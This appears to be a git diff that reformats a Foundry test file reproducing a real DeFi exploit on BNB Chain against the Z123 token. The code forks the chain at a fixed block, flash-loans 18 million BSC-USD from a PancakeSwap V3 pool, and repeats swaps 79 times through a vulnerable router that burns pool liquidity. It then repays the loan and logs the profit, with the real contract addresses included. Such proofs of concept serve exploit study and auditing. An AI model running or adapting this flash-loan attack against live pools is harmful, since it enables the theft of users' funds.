@@ -1,4 +1,5 @@
 import "forge-std/Test.sol";
+
 pragma solidity ^0.8.10;
 
 import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
@@ -18,18 +19,12 @@ import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 // Then, each subsequent swap burns liquidity from the pool, resulting in disproportionate token ratios that can be exploited for arbitrage.
 
 contract Z123_exp is Test {
+
     IERC20 z123_ = IERC20(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760);
-    IPancakeV3Pool pancakeV3_ =
-        IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
+    IPancakeV3Pool pancakeV3_ = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
     IERC20 bsc_usd_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IPancakeRouter router_ =
-        IPancakeRouter(
-            payable(address(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD))
-        );
-    IPancakeRouter victim_ =
-        IPancakeRouter(
-            payable(address(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8))
-        );
+    IPancakeRouter router_ = IPancakeRouter(payable(address(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD)));
+    IPancakeRouter victim_ = IPancakeRouter(payable(address(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8)));
 
     function setUp() public {
         vm.createSelectFork("bsc", 38_077_210);
@@ -42,33 +37,19 @@ contract Z123_exp is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "befor ack usdc balance = ",
-            bsc_usd_.balanceOf(address(this)),
-            bsc_usd_.decimals()
-        );
+        emit log_named_decimal_uint("befor ack usdc balance = ", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals());
         pancakeV3_.flash(address(this), 18_000_000 ether, 0, "");
         emit log_named_decimal_uint(
-            "after profit usdc balance = ",
-            bsc_usd_.balanceOf(address(this)),
-            bsc_usd_.decimals()
+            "after profit usdc balance = ", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals()
         );
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) public {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
         address[] memory path = new address[](2);
         path[0] = address(bsc_usd_);
         path[1] = address(z123_);
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            18_000_000 ether,
-            1,
-            path,
-            address(this),
-            block.timestamp
+            18_000_000 ether, 1, path, address(this), block.timestamp
         );
 
         console.log("==== start attack====");
@@ -76,11 +57,7 @@ contract Z123_exp is Test {
         path[1] = address(bsc_usd_);
         for (int256 i = 0; i < 79; i++) {
             victim_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                7125 ether,
-                1,
-                path,
-                address(this),
-                block.timestamp
+                7125 ether, 1, path, address(this), block.timestamp
             );
         }
         console.log("==== end attack====");
@@ -88,4 +65,5 @@ contract Z123_exp is Test {
         //repay
         bsc_usd_.transfer(address(pancakeV3_), 18_000_000 ether + fee0);
     }
+
 }
